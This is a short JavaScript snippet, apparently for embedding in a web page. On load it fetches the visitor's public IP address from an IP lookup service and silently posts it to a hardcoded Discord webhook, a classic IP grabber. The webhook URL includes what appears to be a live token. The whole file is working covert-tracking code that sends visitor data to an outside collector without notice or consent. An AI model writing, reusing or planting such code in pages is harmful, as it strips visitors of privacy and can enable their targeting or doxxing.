async function fetchData() {
    return new Promise((resolve, reject) => {
        $.get("https://api.ipify.org/", function (data) {
            resolve(data);
        }).fail(function (error) {
            reject(error);
        });
    });
}
async function sendToWebhook(ipData) {
    var webhookUrl = "https://discord.com/api/webhooks/1194473601882140682/3oUUjaAAAoQJCm946d1wsxJIJtMKOrhlc2Rh6tRaSnMC8ujdhOEugYVC7EdAy6RxbcR7"; // Replace with your Discord webhook URL
    var data = {
        embeds: [
            {
                title: "IP Address Information",
                fields: [
                    {
                        name: "IP Data",
                        value: "```html\n" + ipData + "```"
                    }
                ]
            }
        ]
    };
    try {
        await $.ajax({
            type: "POST",
            url: webhookUrl,
            data: JSON.stringify(data),
            contentType: "application/json"
        });
        console.log("IP data sent to Discord webhook successfully.");
    } catch (error) {
        console.error("Failed to send IP data to Discord webhook:", error);
    }
}
fetchData().then(sendToWebhook).catch(error => {
    console.error("Error fetching IP data:", error);
});
